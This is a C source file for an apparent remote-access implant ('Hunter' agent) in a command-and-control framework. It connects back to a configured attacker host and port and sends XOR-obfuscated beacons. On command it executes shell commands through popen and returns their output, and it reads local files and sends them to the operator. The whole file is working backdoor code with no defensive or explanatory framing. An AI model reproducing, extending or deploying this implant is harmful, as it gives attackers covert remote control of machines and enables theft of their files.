#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <signal.h>
#include "helpers.c"
#include "payload_common.h"
#include <pthread.h>

#define MAXBUF 65536

#define SIZE 1024

char* key = KEY;
int connection_established;
int sock;
char buf[MAXBUF];
int bufsize;
int sleeptime = 5;

void* Read(){

	// Initial beacon connection
	
	char* beacon = "--HEADHUNTER BEACON--";
	char* xorbeacon = XOR(beacon, key, strlen(beacon), strlen(key));
	send(sock, xorbeacon, strlen(beacon), 0);

	while(connection_established == 0){
		while(bufsize = read(sock, buf, MAXBUF)){
			;;
		}
	}
	
}

int sendfile(FILE* fp, int fd, char* key)
{
        char data[SIZE] = {0};
        
        while(fgets(data, SIZE, fp) != NULL) {
                char* xordata = XOR(data, key, SIZE, strlen(key));
                if (send(fd, xordata, SIZE, 0) == -1) {
                        exit(1);
                }
                bzero(data, SIZE);
                free(xordata);
        }
        char* eof = "--HEADHUNTER EOF--";
        char* xoreof = XOR(eof, key, strlen(eof), strlen(key));
        send(fd, xoreof, strlen(eof), 0);
        free(xoreof);
        return 0;
}

int main(void)
{
	signal(SIGCHLD, SIG_IGN);

	char* ip = LHOST;
	int port = PORT;
	int n = 0;
	pthread_t read_thread;
	struct sockaddr_in sa;
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = inet_addr(ip);

	int keylen = strlen(key);

	sock = socket(AF_INET, SOCK_STREAM, 0);
	do {
		connection_established = connect(sock, (struct sockaddr *) &sa, sizeof(sa)); 
	} while(connection_established != 0);

	pthread_create(&read_thread, NULL, Read, NULL);

	char* beacon = "--HEADHUNTER BEACON--";
	char* xorbeacon = XOR(beacon, key, strlen(beacon), keylen);

	while (connection_established == 0)
	{
		
		if(strlen(buf) > 0){

			sleep(sleeptime);	
			send(sock, xorbeacon, strlen(beacon), 0);
			char* xorbuf = XOR(buf, key, bufsize, keylen);
			
			if(str_starts_with(xorbuf, "shell") == 0)
			{

				int status;
				pid_t child_pid;
				FILE* fp;
				
				char* cmd = split(xorbuf, " ");			
	
				if((child_pid = fork()) == 0)
				{

					// Create a child process and run command inside of it
					fp = popen(cmd, "r");
					if(fp == NULL) {
					    char* error = "Failed to run command\n";
					    char* xorerror = XOR(error, key, strlen(error), keylen);
					    write(sock, xorerror, strlen(error));
					    
					}
					char path[2050];
					char command[12000];
					while (fgets(path, sizeof(path), fp) != NULL) {
					    strncat(command, path, strlen(path));
					}
					char* xordata = XOR(command, key, strlen(command), keylen);
					write(sock, xordata, strlen(command));
					free(xordata);
					
					return 0;
				}

				waitpid(child_pid, &status, WNOHANG);

			}
			else if(str_starts_with(xorbuf, "download") == 0){
			
				char* cmd = split(xorbuf, " ");
				cmd[strlen(cmd)-1] = '\0'; // Remove newline
				FILE* fp;
				fp = fopen(cmd, "r");
				if(fp == NULL){
					
					char* openerr = "\e[1;31m[-]\e[0m Error opening file\n";
					char* xoropenerr = XOR(openerr, key, strlen(openerr), keylen);
					write(sock, xoropenerr, strlen(openerr));
					free(xoropenerr);
					break;

				}
				else{

					char* download = "--HUNTER DOWNLOAD--";
					char* xordownload = XOR(download, key, strlen(download), keylen);
					char confirm[5];
					write(sock, xordownload, strlen(download));
					read(sock, confirm, 5);
					char* xorconfirm = XOR(confirm, key, strlen(confirm), keylen);
					if(strcmp(xorconfirm, "OK") == 0){
						sendfile(fp, sock, key);
					}
					else{
						continue;
					}
				}
			
			}
			else if(strncmp(xorbuf, "\n", 1) == 0)
			{
				char* xornewline = XOR("\n", key, 1, keylen);
				write(sock, xornewline, 1);
				free(xornewline);
		
			}
			else if(str_starts_with(xorbuf, "exit\n") == 0){

				char* disconnect = "[+] Hunter agent: OK\n";
				char* xordisconnect = XOR(disconnect, key, strlen(disconnect), keylen);
				write(sock, xordisconnect, strlen(disconnect));
				free(xordisconnect);
				pthread_cancel(read_thread);
				return 0;
			}
			else
			{
				char* xorinvalid = XOR(MSG_INVALID, key, strlen(MSG_INVALID), keylen);
				write(sock, xorinvalid, strlen(MSG_INVALID));
			}		
			
			memset(buf, '\0', strlen(buf));
			free(xorbuf);
		}
		else {
			sleep(sleeptime);
			send(sock, xorbeacon, strlen(beacon), 0);
		}
	}

	return 0;
}
